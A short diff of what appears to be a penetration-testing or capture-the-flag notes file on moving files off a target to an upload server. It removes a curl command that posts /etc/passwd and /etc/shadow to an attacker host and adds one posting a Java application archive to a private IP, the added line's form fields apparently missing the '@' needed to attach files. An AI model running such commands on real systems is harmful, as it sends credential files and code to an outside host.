@@ -70,7 +70,7 @@ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
 ```
 Upload Files 
 ```shell
-curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+curl -X POST http://10.10.14.121:8000/upload -F 'files=/app/cloudhosting-0.0.1.jar' -F 'files=cloudhosting-0.0.1.jar'
 ```
 ### Method 2 
 #### Alternate Web servers on host 
